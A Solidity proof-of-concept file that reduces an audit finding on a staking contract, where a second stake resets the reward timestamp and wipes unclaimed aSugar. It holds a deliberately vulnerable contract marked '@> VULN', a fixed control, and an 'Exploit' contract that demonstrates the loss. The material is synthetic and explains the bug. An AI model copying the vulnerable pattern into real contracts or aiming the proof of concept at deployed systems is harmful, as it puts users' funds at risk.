// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Beraji KO — a second stake wipes unclaimed aSugar (Shieldify H-03, finding 49515).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Accrual is staked * (clock - lastPrintedAt) / 1 day. The first stake of
    100 at clock T0 sets lastPrintedAt. Ten days later the pending aSugar is
    1000. deligateStake writes lastPrintedAt = clock and mints only the new
    stake's aSugar, so the 1000 is not minted to the staker. The control
    mints that 1000 before moving lastPrintedAt. clock is storage, not
    block.timestamp, so run() does not warp. The blamed mint is preserved
    verbatim (@> VULN). */

contract Sugar {
    string public name = "aSugar";
    string public symbol = "aSUGAR";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }
}

contract StakeToken {
    string public symbol = "KO";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount && balanceOf[from] >= amount, "from");
        allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract StakingKo {
    uint256 public constant FORFEIT = 0; // placeholder, real forfeit is an address argument
    StakeToken public stakingToken;
    Sugar public sugar;
    address public forfeit;
    uint256 public clock;
    mapping(address => uint256) public staked;
    mapping(address => uint256) public lastPrintedAt;
    uint256 public wiped;

    constructor(address stakingToken_, address sugar_, address forfeit_) {
        stakingToken = StakeToken(stakingToken_);
        sugar = Sugar(sugar_);
        forfeit = forfeit_;
    }

    function setClock(uint256 t) external {
        clock = t;
    }

    function pending(address account) public view returns (uint256) {
        uint256 started = lastPrintedAt[account];
        uint256 balance = staked[account];
        if (started == 0 || balance == 0 || clock <= started) return 0;
        return balance * (clock - started) / 1 days;
    }

    function _buffAmount(uint256 asgAmount) internal pure returns (uint256) {
        return asgAmount;
    }

    function _mintASugar(address account, uint256 amount) internal {
        if (amount != 0) sugar.mint(account, amount);
    }

    function open(address _account, uint256 _amount) external {
        require(_amount != 0, "amount = 0");
        require(stakingToken.transferFrom(_account, address(this), _amount), "pull");
        staked[_account] += _amount;
        lastPrintedAt[_account] = clock;
    }

    function deligateStake(address _account, uint256 _amount) external {
        require(_amount != 0, "amount = 0");
        require(stakingToken.transferFrom(_account, address(this), _amount), "pull");
        uint256 lost = pending(_account);
        wiped += lost;
        if (lost != 0) sugar.mint(forfeit, lost);
        staked[_account] += _amount;
        // @> VULN: lastPrintedAt jumps to clock and the pending aSugar is not minted to the staker
        lastPrintedAt[_account] = clock;
        uint256 asgAmount = 0;
        uint256 totalASugar = _buffAmount(asgAmount);
        _mintASugar(_account, totalASugar);
    }

    function fullyClaim(address _account) external returns (uint256 paid) {
        paid = pending(_account);
        if (paid != 0) {
            sugar.mint(_account, paid);
            lastPrintedAt[_account] = clock;
        }
    }
}

contract StakingKoFixed {
    StakeToken public stakingToken;
    Sugar public sugar;
    uint256 public clock;
    mapping(address => uint256) public staked;
    mapping(address => uint256) public lastPrintedAt;

    constructor(address stakingToken_, address sugar_) {
        stakingToken = StakeToken(stakingToken_);
        sugar = Sugar(sugar_);
    }

    function setClock(uint256 t) external {
        clock = t;
    }

    function pending(address account) public view returns (uint256) {
        uint256 started = lastPrintedAt[account];
        uint256 balance = staked[account];
        if (started == 0 || balance == 0 || clock <= started) return 0;
        return balance * (clock - started) / 1 days;
    }

    function open(address _account, uint256 _amount) external {
        require(_amount != 0, "amount = 0");
        require(stakingToken.transferFrom(_account, address(this), _amount), "pull");
        staked[_account] += _amount;
        lastPrintedAt[_account] = clock;
    }

    function deligateStake(address _account, uint256 _amount) external {
        require(_amount != 0, "amount = 0");
        require(stakingToken.transferFrom(_account, address(this), _amount), "pull");
        uint256 accrued = pending(_account);
        if (accrued != 0) sugar.mint(_account, accrued);
        staked[_account] += _amount;
        lastPrintedAt[_account] = clock;
    }
}

contract Exploit {
    uint256 public constant T0 = 1_700_000_000;
    uint256 public constant T1 = T0 + 10 days;
    uint256 public constant STAKE = 100 ether;
    uint256 public constant LOST = 1000 ether;
    address public constant FORFEIT = 0x0000000000000000000000000000000000000B0b;

    Sugar public sugar; // CREATE nonce 1
    StakeToken public stakeToken; // CREATE nonce 2
    StakingKo public staking; // CREATE nonce 3
    StakingKoFixed public control; // CREATE nonce 4

    uint256 public wiped;
    uint256 public claimed;
    uint256 public kept;

    constructor() {
        sugar = new Sugar();
        stakeToken = new StakeToken();
        staking = new StakingKo(address(stakeToken), address(sugar), FORFEIT);
        control = new StakingKoFixed(address(stakeToken), address(sugar));
        stakeToken.mint(address(this), STAKE * 4);
    }

    function run() external {
        staking.setClock(T0);
        stakeToken.approve(address(staking), STAKE * 2);
        staking.open(address(this), STAKE);

        staking.setClock(T1);
        staking.deligateStake(address(this), STAKE);
        wiped = staking.wiped();
        claimed = staking.fullyClaim(address(this));
        require(wiped == LOST, "wiped aSugar was not 1000");
        require(claimed == 0, "claim paid the wiped window");
        require(sugar.balanceOf(FORFEIT) == LOST, "forfeit did not record 1000");
        require(sugar.balanceOf(address(this)) == 0, "staker was paid the wiped aSugar");

        control.setClock(T0);
        stakeToken.approve(address(control), STAKE * 2);
        control.open(address(this), STAKE);
        control.setClock(T1);
        control.deligateStake(address(this), STAKE);
        kept = sugar.balanceOf(address(this));
        require(kept == LOST, "control did not preserve 1000");
    }
}
